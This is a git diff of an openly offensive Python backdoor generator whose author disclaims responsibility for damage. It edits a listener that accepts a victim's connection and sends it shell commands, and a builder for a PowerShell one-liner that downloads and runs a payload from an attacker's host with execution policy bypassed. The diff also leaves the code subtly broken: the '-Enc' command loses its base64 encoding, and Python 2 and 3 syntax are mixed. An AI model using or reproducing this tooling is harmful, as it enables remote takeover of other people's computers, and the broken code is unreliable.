@@ -49,8 +49,9 @@ responsible for any damage you cause :) if you get in trouble I don't care
 
         elif option == '2':
             socket_create()
-            socket_connbind()
-            socket_connaccep()
+            socket_bind()
+            socket_accept()
+
 
 
 def backdoor_generator():
@@ -79,7 +80,7 @@ def backdoor_generator():
                    ~ 3 Immersive Backdoors ~ 
 
 
-1. Linux/OSX Backdoor Generate
+1. Linux Backdoor Generate
 2. Windows Generic Backdoor
 3. Powershell Liner Backdoor
 
@@ -231,7 +232,7 @@ int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdPara
 
 
                          
-def powershell_payload(): # Poweershell payload creation
+def powershell_payload(): # Powershell payload creation
 
     payload = """
 
@@ -246,7 +247,7 @@ read payload
 
 scriptblock="iex (New-Object Net.WebClient).DownloadString("http://$ip/$payload")"
 
-encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"
+encode="`echo $scriptblock `"
 
 command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 
@@ -258,17 +259,7 @@ echo $command
     os.system(payload)
 
 
-def socket_create(): #creates a socket connection
-    try:
-        global s
-        s = socket.socket();
-        print("Connection created.")
-    except socket.error as msg:
-        print("Connection creation error: "+str(msg))
-
-
-def socket_connbind(): #Bind socket to a port
-    
+def socket_create():
     print """
 
  _______________          |*\_/*|________ 
@@ -288,32 +279,50 @@ def socket_connbind(): #Bind socket to a port
 
 """
 
-
-
     try:
+        global host
+        global port
+        global s
         host = ''
         port = int(raw_input("Please specify the port :"))
+        s = socket.socket()
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+
+
+# Bind socket to port (the host and port the communication will take place) and wait for connection from client
+def socket_bind():
+    try:
+        global host
+        global port
+        global s
+        print("Binding socket to port: " + str(port))
         s.bind((host, port))
         s.listen(5)
-        print("Socket binding to port...")
     except socket.error as msg:
-        print("Socket bind error: "+str(msg))
-        sc_bind()
+        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
+        socket_bind()
 
 
-def socket_connaccep(): # Accept Connection
+# Establish connection with client (socket must be listening for them)
+def socket_accept():
     conn, address = s.accept()
-    print("Connection established with" + address[0])
-    cmd_exe(conn)
+    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
+    send_commands(conn)
+    conn.close()
 
 
-def command_exec(conn): # Send commands to client
-    cmd = input();
-    conn.send(str.encode(cmd))
-    response = str(conn.recv(1024), "utf-8")
-    print(response)
-
-
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            
 
 if __name__ == '__main__':
     main()
